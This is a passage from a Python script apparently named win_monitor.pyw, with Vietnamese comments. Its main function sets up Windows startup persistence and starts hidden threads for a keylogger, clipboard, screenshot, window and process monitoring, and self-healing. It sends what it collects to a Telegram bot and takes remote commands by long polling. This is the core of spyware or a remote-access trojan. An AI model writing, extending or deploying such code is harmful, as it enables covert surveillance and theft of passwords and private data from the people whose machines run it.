    if "--token" in _argv:
        try:
            cfg_set("bot_token", _argv[_argv.index("--token") + 1])
        except Exception:
            pass
    if "--chat" in _argv:
        try:
            cfg_set("chat_id", _argv[_argv.index("--chat") + 1])
        except Exception:
            pass

    token = str(cfg_get("bot_token", ""))
    if not token or "PUT_YOUR" in token:
        log("Chua cau hinh bot_token. Dung.")
        # van thu hien thi loi ra console neu co
        try:
            print("Chua cau hinh bot_token trong win_monitor.pyw")
        except Exception:
            pass
        return

    if not acquire_single_instance():
        log("Da co 1 ban WinMonitor dang chay. Thoat.")
        return

    # duy tri khoi dong cung Windows
    ensure_persistence()

    # luong gui
    threading.Thread(target=sender_loop, daemon=True).start()

    # cac luong giam sat
    threading.Thread(target=screenshot_loop, daemon=True).start()
    threading.Thread(target=window_monitor, daemon=True).start()
    threading.Thread(target=process_monitor, daemon=True).start()
    threading.Thread(target=clipboard_monitor, daemon=True).start()
    threading.Thread(target=keylogger_loop, daemon=True).start()
    threading.Thread(target=heartbeat_loop, daemon=True).start()
    threading.Thread(target=selfheal_loop, daemon=True).start()

    log("WinMonitor started.")
    notify("✅ <b>WinMonitor đã khởi động</b> trên máy này.\nGửi /help để xem lệnh.")

    # vong lap nhan lenh (long polling)
    offset = 0
    while RUNNING:
        try:
            res = tg_call("getUpdates", {
                "offset": offset, "timeout": 25,
                "allowed_updates": json.dumps(["message"]),
            }, timeout=40)
            if not res.get("ok"):
                log("getUpdates not ok: %s" % res.get("description", res.get("error", "")))
                time.sleep(3)
                continue
            for upd in res.get("result", []):
                offset = upd["update_id"] + 1
                handle_update(upd)
        except Exception as e:
            log("main loop error: %s" % e)
            time.sleep(3)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        RUNNING = False
    except Exception:
        log("FATAL: %s" % traceback.format_exc())
